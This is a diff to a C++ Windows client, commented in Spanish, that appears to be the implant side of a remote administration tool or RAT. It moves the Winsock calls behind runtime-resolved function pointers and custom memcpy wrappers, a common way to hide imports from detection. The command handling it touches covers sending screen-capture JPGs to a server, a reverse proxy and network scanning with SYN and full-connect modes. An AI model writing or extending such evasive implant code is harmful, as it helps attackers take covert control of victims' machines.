@@ -111,48 +111,75 @@ Cliente::Cliente() {
     
     //Cargar modulo para carga dinamica de funciones y dlls
     this->mod_dynamic = new DynamicLoad();
+
+    if (this->mod_dynamic->WS32.pWsaStartup) {
+        WSADATA wsa;
+        if (this->mod_dynamic->WS32.pWsaStartup(MAKEWORD(2, 2), &wsa) != 0) {
+            error();
+            return;
+        }
+    }else {
+        __DBG_("[X][Cliente] No se cargo WSASTARTUP...");
+    }
 }
 
 void Cliente::TEST() {
-    this->mod_dynamic->LoadNetProcs();
-    this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
+    //this->mod_dynamic->LoadNetProcs();
+    //this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
     return;
 }
 
 Cliente::~Cliente() {
-	this->CerrarConexion();
+    this->CerrarConexion();
+    
+    if (this->mod_dynamic->WS32.pWSACleanup) {
+        this->mod_dynamic->WS32.pWSACleanup();
+    }
+
     this->DestroyClasses();
     DeleteObj<DynamicLoad>(this->mod_dynamic);
 
 }
 
 void Cliente::CerrarConexion() {
+    if (!this->mod_dynamic->WS32.pCloseSocket) {
+        __DBG_("[X]Cerrarconexion no se cargo la funcion closesocket");
+        return;
+    }
     if (this->sckSocket != INVALID_SOCKET) {
-		closesocket(this->sckSocket);
+        this->mod_dynamic->WS32.pCloseSocket(this->sckSocket);
 		this->sckSocket = INVALID_SOCKET;
 	}
 }
 
 bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
+    if (!this->mod_dynamic->WS32.pGetAddrInfo ||
+        !this->mod_dynamic->WS32.pSocket ||
+        !this->mod_dynamic->WS32.pConnect ||
+        !this->mod_dynamic->WS32.pFreeAddrInfo ||
+        !this->mod_dynamic->WS32.pIoctlSocket) {
+        __DBG_("[X]bConectar: No se cargaron las funciones");
+        return false;
+    }
 	struct addrinfo sAddress, *sP, *sServer;
-	memset(&sAddress, 0, sizeof(sAddress));
+    m_memset(&sAddress, 0, sizeof(sAddress));
 
 	sAddress.ai_family = AF_UNSPEC;
 	sAddress.ai_socktype = SOCK_STREAM;
 
-	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
+	int iRes = this->mod_dynamic->WS32.pGetAddrInfo(cIP, cPuerto, &sAddress, &sServer);
 	if (iRes != 0) {
         __DBG_( "[X] getaddrinfo error" );
 		return false;
 	}
 
 	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
-		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
+		if ((this->sckSocket = this->mod_dynamic->WS32.pSocket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
 			//socket error
 			continue;
 		}
 
-		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
+		if (this->mod_dynamic->WS32.pConnect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
 			//No se pudo conectar
             __DBG_("[X] No se pudo conectar");
 			continue;
@@ -162,16 +189,16 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 	}
 
 	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
-        freeaddrinfo(sServer);
+        this->mod_dynamic->WS32.pFreeAddrInfo(sServer);
         return false;
 	}
 
-    unsigned long int iBlock = 1;
-    if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
+    unsigned long iBlock = 1;
+    if (this->mod_dynamic->WS32.pIoctlSocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
         __DBG_( "[X] No se pudo hacer non_block" );
     }
 
-    freeaddrinfo(sServer);
+    this->mod_dynamic->WS32.pFreeAddrInfo(sServer);
     
 	return true;
 }
@@ -593,8 +620,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                     uiPacketSize = iHeaderSize + iJPGBufferSize;
                     std::vector<BYTE> cPacket(uiPacketSize);
                     if (cPacket.size() > 0) {
-                        memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
-                        memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
+                        m_memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
+                        m_memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
 
                         int iSent = this->cChunkSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr, EnumComandos::CM_Single_Salida);
                         _DBG_("[!] bytes sent", iSent);
@@ -974,7 +1001,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Datos de proxy remoto
     if (iComando == EnumComandos::PROXY_CMD) {
         if (!this->mod_ReverseProxy) {
-            this->mod_ReverseProxy = new ReverseProxy();
+            this->mod_ReverseProxy = new ReverseProxy(this->mod_dynamic->WS32);
         }
         std::vector<char> buffer(paquete.cBuffer);
         this->mod_ReverseProxy->m_ProcesarDatosProxy(buffer, iRecibido - 1);
@@ -988,7 +1015,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::Net_Scan) {
         if (!this->mod_Scan) {
             this->mod_dynamic->LoadNetProcs();
-            this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
+            this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
         }
         std::string strPaquete = "";
         for (Host_Entry& host : this->mod_Scan->m_Escanear(paquete.cBuffer.data())) {
@@ -1005,7 +1032,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         iComando == EnumComandos::Net_Scan_Full_Sck || iComando == EnumComandos::Net_Scan_Full_Syn) {
         if (!this->mod_Scan) {
             this->mod_dynamic->LoadNetProcs();
-            this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
+            this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI, this->mod_dynamic->WS32);
         }
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "|", 3);
         if (vcData.size() == 3) {
@@ -1085,7 +1112,7 @@ void Cliente::Procesar_Paquete(const Paquete& paquete) {
     std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
     size_t oldsize = acumulador.size();
     acumulador.resize(oldsize + paquete.uiTamBuffer);
-    memcpy(acumulador.data() + oldsize, paquete.cBuffer.data(), paquete.uiTamBuffer);
+    m_memcpy(acumulador.data() + oldsize, paquete.cBuffer.data(), paquete.uiTamBuffer);
 
     if (paquete.uiIsUltimo == 1) {
         //Agregar al queue de comandos
@@ -1219,7 +1246,7 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
                 return SOCKET_ERROR;
             }
 
-            memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);
+            m_memcpy(nPaquete.cBuffer.data(), pBuffer + iBytePos, iChunkSize);
 
             //Print_Packet(nPaquete);
 
@@ -1243,14 +1270,18 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
 }
 
 int Cliente::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags) {
+    if (!this->mod_dynamic->WS32.pSend || !this->mod_dynamic->WS32.pWSAGetLastError) {
+        __DBG_("[X]send_all no se cargaron las funciones");
+        return -1;
+    }
     int iEnviado = 0;
     int iTotalEnviado = 0;
     while (iTotalEnviado < pLen) {
-        iEnviado = send(pSocket, pBuffer + iTotalEnviado, pLen - iTotalEnviado, pFlags);
+        iEnviado = this->mod_dynamic->WS32.pSend(pSocket, pBuffer + iTotalEnviado, pLen - iTotalEnviado, pFlags);
         if (iEnviado == 0) {
             break;
         }else if (iEnviado == SOCKET_ERROR) {
-            int error = WSAGetLastError();
+            int error = this->mod_dynamic->WS32.pWSAGetLastError();
             if (error == WSAEWOULDBLOCK) {
                 //Aun no se puede escribir
                 //Usar select en lugar de sleep?
@@ -1288,8 +1319,8 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
 
     //Enviar al inicio el size del paquete
     std::vector<char> cBufferFinal(iDataSize + sizeof(int));
-    memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
-    memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
+    m_memcpy(cBufferFinal.data(), &iDataSize, sizeof(int));
+    m_memcpy(cBufferFinal.data() + sizeof(int), cData.data(), iDataSize);
 
     iDataSize += sizeof(int);
 
@@ -1322,15 +1353,19 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
 }
 
 int Cliente::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
+    if (!this->mod_dynamic->WS32.pRecv || !this->mod_dynamic->WS32.pWSAGetLastError) {
+        __DBG_("[X]send_all no se cargaron las funciones");
+        return -1;
+    }
     int iRecibido = 0;
     int iTotalRecibido = 0;
     while (iTotalRecibido < pLen) {
-        iRecibido = recv(pSocket, pBuffer+iTotalRecibido, pLen-iTotalRecibido, pFlags);
+        iRecibido = this->mod_dynamic->WS32.pRecv(pSocket, pBuffer+iTotalRecibido, pLen-iTotalRecibido, pFlags);
         if (iRecibido == 0) {
             //Se cerro el socket
             break;
         }else if (iRecibido == SOCKET_ERROR) {
-            int error = WSAGetLastError();
+            int error = this->mod_dynamic->WS32.pWSAGetLastError();
             if (error == WSAEWOULDBLOCK) {
                 //Aun no se puede leer
                 std::this_thread::sleep_for(std::chrono::milliseconds(10));
@@ -1370,16 +1405,20 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     char cBuffSize[sizeof(int)];
     int iPaquetesize = recv(pSocket, cBuffSize, sizeof(int), pFlags);
     if (err_code != nullptr) {
-        *err_code = WSAGetLastError();
+        if (this->mod_dynamic->WS32.pWSAGetLastError) {
+            *err_code = this->mod_dynamic->WS32.pWSAGetLastError();
+        }
     }
 
     if (iPaquetesize == sizeof(int)) {
-        memcpy(&iPaquetesize, cBuffSize, sizeof(int));
+        m_memcpy(&iPaquetesize, cBuffSize, sizeof(int));
         if (iPaquetesize > 0 && iPaquetesize < MAX_PAQUETE_SIZE) {
             cRecvBuffer.resize(iPaquetesize);
             iRecibido = this->recv_all(pSocket, cRecvBuffer.data(), iPaquetesize, pFlags);
             if (err_code != nullptr) {
-                *err_code = WSAGetLastError();
+                if (this->mod_dynamic->WS32.pWSAGetLastError) {
+                    *err_code = this->mod_dynamic->WS32.pWSAGetLastError();
+                }
             }
             if (iRecibido == SOCKET_ERROR) {
                 _DBG_("No se pudo leer nada recv_all.", iRecibido);
@@ -1415,7 +1454,7 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
 
     pBuffer.resize(iRecibido);
     if (pBuffer.size() == iRecibido) {
-        memcpy(pBuffer.data(), bOut.data(), iRecibido);
+        m_memcpy(pBuffer.data(), bOut.data(), iRecibido);
     }else {
         _DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida", GetLastError());
         return 0;
@@ -1424,17 +1463,17 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
 }
 
 void Cliente::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
-    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
-    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
-    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
-    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
+    m_memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
+    m_memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
+    m_memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
+    m_memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
 }
 
 bool Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size) {
     if (bufer_size < PAQUETE_MINIMUM_SIZE) { return false; }
-    memcpy(&paquete.uiTipoPaquete, cBuffer,  sizeof(paquete.uiTipoPaquete));
-    memcpy(&paquete.uiTamBuffer,   cBuffer + sizeof(paquete.uiTipoPaquete),  sizeof(paquete.uiTamBuffer));
-    memcpy(&paquete.uiIsUltimo,    cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer),  sizeof(paquete.uiIsUltimo));
+    m_memcpy(&paquete.uiTipoPaquete, cBuffer,  sizeof(paquete.uiTipoPaquete));
+    m_memcpy(&paquete.uiTamBuffer,   cBuffer + sizeof(paquete.uiTipoPaquete),  sizeof(paquete.uiTamBuffer));
+    m_memcpy(&paquete.uiIsUltimo,    cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer),  sizeof(paquete.uiIsUltimo));
     
     if (paquete.uiTamBuffer > 0 && paquete.uiTamBuffer < MAX_PAQUETE_SIZE) {
         paquete.cBuffer.resize(paquete.uiTamBuffer);
@@ -1443,7 +1482,7 @@ bool Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int b
     }
 
     if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
-        memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
+        m_memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
     }else {
         _DBG_("[DESER] No se pudo reservar memoria", GetLastError());
         return false;
